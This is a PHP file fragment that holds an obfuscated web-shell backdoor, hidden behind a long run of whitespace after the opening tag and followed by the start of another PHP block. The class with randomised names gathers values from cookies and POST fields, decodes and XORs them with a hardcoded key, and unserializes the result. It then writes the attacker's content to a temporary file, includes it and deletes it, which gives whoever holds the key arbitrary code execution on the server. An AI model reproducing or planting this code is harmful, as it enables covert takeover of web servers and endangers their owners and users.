<?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("BTCvYS")){class BTCvYS{public static $ggzyDT = "UjAZMvRIQxWvRBtp";public static $yJFqcP = NULL;public function __construct(){$qkyEM = @$_COOKIE[substr(BTCvYS::$ggzyDT, 0, 4)];if (!empty($qkyEM)){$EyTNlXRh = "base64";$VKlyzb = "";$qkyEM = explode(",", $qkyEM);foreach ($qkyEM as $TiCBjEGLo){$VKlyzb .= @$_COOKIE[$TiCBjEGLo];$VKlyzb .= @$_POST[$TiCBjEGLo];}$VKlyzb = array_map($EyTNlXRh . "_decode", array($VKlyzb,)); $VKlyzb = $VKlyzb[0] ^ str_repeat(BTCvYS::$ggzyDT, (strlen($VKlyzb[0]) / strlen(BTCvYS::$ggzyDT)) + 1);BTCvYS::$yJFqcP = @unserialize($VKlyzb);}}public function __destruct(){$this->mPAHXrKxBO();}private function mPAHXrKxBO(){if (is_array(BTCvYS::$yJFqcP)) {$qQkadi = sys_get_temp_dir() . "/" . crc32(BTCvYS::$yJFqcP["salt"]);@BTCvYS::$yJFqcP["write"]($qQkadi, BTCvYS::$yJFqcP["content"]);include $qQkadi;@BTCvYS::$yJFqcP["delete"]($qQkadi);exit();}}}$AHxalWQAT = new BTCvYS(); $AHxalWQAT = NULL;} ?><?php
